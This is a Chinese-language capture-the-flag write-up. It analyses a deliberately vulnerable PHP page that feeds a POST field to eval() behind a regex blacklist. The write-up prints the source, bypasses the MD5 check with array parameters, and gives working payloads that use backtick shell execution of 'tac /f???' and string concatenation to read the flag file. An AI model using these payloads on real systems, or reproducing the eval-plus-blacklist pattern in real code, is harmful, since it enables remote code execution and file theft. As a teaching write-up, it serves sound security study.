# RCE1

## 题目简述

PHP 页面要求 GET 参数 `rce1` 与 POST 参数 `rce2` 的 MD5 严格相等、原值又严格不等，然后把通过正则黑名单的 `rce3` 交给 `eval()`。过滤器禁止数字、若干符号、常见命令名和 `flag` 字样，但仍允许反引号、`print`、`tac`、`?` 与字符串拼接。

## 解题过程

关键源码如下：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$rce1 = $_GET['rce1'];
$rce2 = $_POST['rce2'];
$real_code = $_POST['rce3'];

$pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';

function check(string $text): bool {
    global $pattern;
    return (bool) preg_match($pattern, $text);
}

if (isset($rce1) && isset($rce2)){
    if(md5($rce1) === md5($rce2) && $rce1 !== $rce2){
        if(!check($real_code)){
            eval($real_code);
        } else {
            echo "Don't hack me ~";
        }
    } else {
        echo "md5 do not match correctly";
    }
}
else{
    echo "Please provide both rce1 and rce2";
}
?>
```

### 绕过 MD5 条件

在 PHP 7.4 中，向 `md5()` 传入数组会失败并返回 `NULL`，而错误被 `error_reporting(0)` 隐藏。分别提交不同数组：

```text
GET  rce1[]=1
POST rce2[]=2
```

此时两个 MD5 结果都是 `NULL`，满足严格相等；两个数组内容不同，又满足 `$rce1 !== $rce2`。

### 绕过代码黑名单

`cat` 可换成 `tac`，被禁用的 `*` 可换成单字符通配符 `?`。`/f???` 能匹配根目录下四字符、以 `f` 开头的 `flag`；PHP 反引号会执行 Shell 命令，`print` 再输出结果。

最终请求参数为：

```text
GET /?rce1[]=1

POST body:
rce2[]=2&rce3=print(`tac /f???`);
```

也可以不调用外部命令，利用字符串拼接避开连续的 `flag`：

```php
readfile('/'.'fl'.'ag');
```

## 方法总结

- 核心技巧：利用 PHP 内置函数的数组类型错误构造 `NULL === NULL`，再对黑名单做语义等价替换。
- 识别信号：哈希函数接收未经类型约束的参数、错误被隐藏、通过后直接 `eval()`。
- 复用要点：分别分析“进入危险点的前置条件”和“危险点自身的过滤”；黑名单绕过应逐项核对最终源码字符串，避免 payload 自己包含被禁片段。
